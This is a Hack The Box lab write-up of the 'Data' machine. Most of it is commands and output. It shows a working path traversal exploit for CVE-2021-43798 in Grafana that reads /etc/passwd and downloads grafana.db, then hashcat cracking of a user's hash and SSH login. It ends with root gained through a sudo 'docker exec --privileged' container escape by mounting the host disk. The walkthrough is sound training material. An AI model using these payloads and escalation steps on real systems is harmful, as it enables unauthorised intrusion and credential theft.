---
{"dg-publish":true,"permalink":"/ct-fs/htb/data/","dgShowFileTree":true,"dg-note-properties":{}}
---

#linux #Grafana #web #path_traversal #hashcat #docker #sudo #container_escape #mount

## Recon
![Pasted image 20261030103039.png](/img/user/CTFs/HTB/Images/Data%20Images/Pasted%20image%2020261030103039.png)

### Nmap:
```zsh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  http    Grafana http
|_http-title: Did not follow redirect to /login
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1281.90 seconds
```
Initial portscanning shows open ports on 22 (ssh) and on 3000 (Web server). The webserver is running something called Grafana. Adding `data.htb` to `/etc/hosts`.


### Web

#### Manual Enumeration
![Pasted image 20261030110619.png](/img/user/CTFs/HTB/Images/Data%20Images/Pasted%20image%2020261030110619.png)
Visiting the site in a browser we are redirected to `/login` where we can see the version number of the web server.
## Initial Access
### CVE-2021-43798
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/data/scanning]
└─$ curl -v http://data.htb:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
*   Trying 10.129.234.47:3000...
* Host data.htb:3000 was resolved.
* IPv6: (none)
* IPv4: 10.129.234.47
* Established connection to data.htb (10.129.234.47 port 3000) from 10.10.14.24 port 57460 
* using HTTP/1.x
> GET /public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
> Host: data.htb:3000
> User-Agent: curl/8.22.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Accept-Ranges: bytes
< Cache-Control: no-cache
< Content-Length: 1230
< Content-Type: text/plain; charset=utf-8
< Expires: -1
< Last-Modified: Tue, 08 Jun 2021 06:24:39 GMT
< Pragma: no-cache
< X-Content-Type-Options: nosniff
< X-Frame-Options: deny
< X-Xss-Protection: 1; mode=block
< Date: Fri, 30 Oct 2026 18:05:11 GMT
< 
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
* Connection #0 to host data.htb:3000 left intact
```
Online research reveals that Grafana up to our version number is vulnerable to a path traversal vulnerability known as [CVE-2021-43798](https://www.sentinelone.com/vulnerability-database/cve-2021-43798/?utm_source=https%3A%2F%2Fwww.google.com%2F&utm_medium=organic-search) in the `/public/plugins/<app_name>/` directory. We used the `mysql` plugin randomly as it was the one used in this [demonstration](https://hackerone.com/reports/1427086) online and it worked!

>[!info]
>![Pasted image 20261030110959.png](/img/user/CTFs/HTB/Images/Data%20Images/Pasted%20image%2020261030110959.png)
>As you can see Grafana fails to properly validate user input and path canonicalization.

### Data Exfil
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/data/scanning]
└─$ curl -v http://data.htb:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fgrafana%2Fgrafana.db --output ../files/grafana.db
* Host data.htb:3000 was resolved.
* IPv6: (none)
* IPv4: 10.129.234.47
*   Trying 10.129.234.47:3000...
* Established connection to data.htb (10.129.234.47 port 3000) from 10.10.14.24 port 33142 
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
  0      0   0      0   0      0      0      0                              0* using HTTP/1.x
> GET /public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fgrafana%2Fgrafana.db HTTP/1.1
> Host: data.htb:3000
> User-Agent: curl/8.22.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Accept-Ranges: bytes
< Cache-Control: no-cache
< Content-Length: 598016
< Content-Type: application/octet-stream
< Expires: -1
< Last-Modified: Fri, 30 Oct 2026 18:14:49 GMT
< Pragma: no-cache
< X-Content-Type-Options: nosniff
< X-Frame-Options: deny
< X-Xss-Protection: 1; mode=block
< Date: Fri, 30 Oct 2026 18:16:03 GMT
< 
{ [3763 bytes data]
100 584.0k 100 584.0k   0      0 250.6k      0   00:02   00:02         247.8k
* Connection #0 to host data.htb:3000 left intact
```
More online research shows there's a sqlite 3 database sitting at `/var/lib/grafana/grafana.db`. We call out to that via our path traversal vulnerability and output it to `grafana.db` on our attacker machine.

![Pasted image 20261030112152.png](/img/user/CTFs/HTB/Images/Data%20Images/Pasted%20image%2020261030112152.png)
Looking at the db inside `sqlitebrowser` we see there are two user entries for `admin` and `boris` on the server. Each with a password hash, salt, and rand value. Online research reveals Grafana uses PBKDF2-HMAC-SHA256 types. With that in mind we can reconstruct these in a format `hashcat` will be able to work with.

#### Cracking Boris's Hash
```zsh
┌──(kali㉿kali)-[~/…/data/loot/hashes/grafana2hashcat]
└─$ python3 grafana2hashcat.py hashes.txt 

[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  hashes.txt
[+] Done! Read 1 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[*] Outfile was not declared, printing output to stdout instead.

sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=


[+] Now, you can run Hashcat with the following command, for example:

hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt

```
More research online revealed a script much like the "2john" scripts in kali that will take the raw dump of the user table in the `hash,salt` format and reconstruct the strings to be used with `hashcat`. We recreate boris' hash in hashcat format.

```zsh
┌──(kali㉿kali)-[~/…/HTB/data/loot/hashes]
└─$ hashcat -m 10900 boris.b64 /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i7-14700F, 1923/3846 MB (1923 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (4575 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0...O1Hag=
Time.Started.....: Fri Oct 30 15:50:56 2026 (1 sec)
Time.Estimated...: Fri Oct 30 15:50:57 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:     6529 H/s (12.38ms) @ Accel:204 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1632/14344385 (0.01%)
Rejected.........: 0/1632 (0.00%)
Restore.Point....: 816/14344385 (0.01%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:9000-9999
Candidate.Engine.: Device Generator
Candidates.#01...: angeles -> punkrock
Hardware.Mon.#01.: Util: 57%

Started: Fri Oct 30 15:50:56 2026
Stopped: Fri Oct 30 15:50:58 2026
```
We run that through hashcat mode 10900 as the hash reconstruction script suggested and it cracks Boris' password in two seconds.

### SSH
```zsh
┌──(kali㉿kali)-[~/…/data/loot/hashes/grafana2hashcat]
└─$ ssh boris@data.vl 
The authenticity of host 'data.vl (10.129.234.47)' can't be established.
ED25519 key fingerprint is: SHA256:kKsFY4lOfr5Romb/aAy0GtkTZTFbOGC5rZwkh4dGx+s
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'data.vl' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
boris@data.vl's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Fri Oct 30 19:54:37 UTC 2026

  System load:  0.0               Processes:              208
  Usage of /:   41.9% of 4.78GB   Users logged in:        0
  Memory usage: 27%               IP address for eth0:    10.129.234.47
  Swap usage:   0%                IP address for docker0: 172.17.0.1


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

122 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 18.04 at
https://ubuntu.com/18-04


Last login: Wed Jun  4 13:37:31 2025 from 10.10.14.62
boris@data:~$ 
```
We successfully abuse the cracked password to get a shell as `boris` on the server.

#### User.txt
```zsh
boris@data:~$ alias ls='ls -lash --color'
boris@data:~$ ls
total 36K
4.0K drwxr-xr-x 5 boris boris 4.0K Jun  4  2025 .
4.0K drwxr-xr-x 3 root  root  4.0K Jun  4  2025 ..
   0 lrwxrwxrwx 1 boris boris    9 Jan 23  2022 .bash_history -> /dev/null
4.0K -rw-r--r-- 1 boris boris  220 Jan 23  2022 .bash_logout
4.0K -rw-r--r-- 1 boris boris 3.7K Jan 23  2022 .bashrc
4.0K drwx------ 2 boris boris 4.0K Jan 23  2022 .cache
4.0K drwx------ 3 boris boris 4.0K Jan 23  2022 .gnupg
4.0K drwxrwxr-x 3 boris boris 4.0K Jan 23  2022 .local
4.0K -rw-r--r-- 1 boris boris  807 Jan 23  2022 .profile
4.0K -rw-r----- 1 boris boris   33 Oct 30 17:28 user.txt
boris@data:~$ 
```
We find `user.txt` sitting in our user's home folder.
## Privilege Escalation
### File System Enumeration
```zsh
boris@data:~$ find / -iname grafana 2>/dev/null
boris@data:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
boris:x:1001:1001:,,,:/home/boris:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false
```
Taking a look at `/etc/passwd` this time from inside the server we see that the grafana user is missing. Additionally we cannot find any grafana files with the `find` command.

```zsh
boris@data:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68
```
However when we query open ports on the server we still see 3000 is listening. This may suggest we are in some form of containerized environment, or that grafana may be containerized. Either way. Let's keep digging.

```zsh
boris@data:~$ find / -name 'docker.sock' 2>/dev/null
/run/docker.sock
boris@data:~$ which docker
/snap/bin/docker
```
Doing some base container checks we do confirm that the target system is running docker with an exposed docker socket.
### Sudo Permission Abuse (Docker Exec)
```zsh
boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
    

boris@data:~$ sudo /snap/bin/docker exec -it grafana "id"
uid=472(grafana) gid=0(root) groups=0(root)
```
Looking at our user's sudo privileges we see they have the ability to call `/snap/bin/docker exec *` as `root` without a password. We do so, calling `grafana` as our container which was a guess since that's the app inside the docker container and the command `id`, and as you can see, the system responds that we are the `grafana` user that has an effective group id as `root` on this server. Let's get a shell with this access.

#### Locating the filesystem mounted in docker
```zsh
boris@data:~$ mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001016k,nr_inodes=250254,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=203120k,mode=755)
/dev/sda1 on / type ext4 (rw,relatime)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=25,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=13253)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
mqueue on /dev/mqueue type mqueue (rw,relatime)
configfs on /sys/kernel/config type configfs (rw,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
/var/lib/snapd/snaps/core18_2253.snap on /snap/core18/2253 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/amazon-ssm-agent_4046.snap on /snap/amazon-ssm-agent/4046 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/docker_1125.snap on /snap/docker/1125 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/snapd_14066.snap on /snap/snapd/14066 type squashfs (ro,nodev,relatime,x-gdu.hide)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
tmpfs on /run/snapd/ns type tmpfs (rw,nosuid,noexec,relatime,size=203120k,mode=755)
nsfs on /run/snapd/ns/docker.mnt type nsfs (rw)
tmpfs on /run/user/1001 type tmpfs (rw,nosuid,nodev,relatime,size=203116k,mode=700,uid=1001,gid=1001
```
Next we must determine where the filesystem `/` is mounted inside the container. As you can see we find it at `/dev/sda1`

#### Exploit Steps
```zsh
boris@data:~$ sudo /snap/bin/docker exec --privileged --user root -it grafana "/bin/bash"
bash-5.1# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

```
Looking more into the command online I remember to pass the `--privileged` and `--user` flags declaring root as the user so that we spawn as `root` inside the container.

```zsh
bash-5.1# mount /dev/sda1 /mnt/

bash-5.1# ls /mnt/root
root.txt  snap
```
Once inside the container we then mount `/dev/sda1` which reveals we are inside the main filesystem and have root permissions where we find that we have permission to view `/root` which contains our root flag. pwned.


## Final Thoughts
>[!Takeaways]
>- Whenever you're recreating hashes from a popular application. see if there is a script to construct it for you. saves tons of time.
>- Whenever you have sudo permissions to use `docker exec` remember to pass `--privileged` and `--user root` to retain root permissions and to spawn as `root` inside the container.
>- Whenever you're in a containerized env be sure to find where the main filesystem is mounted inside the container so you can escape it.

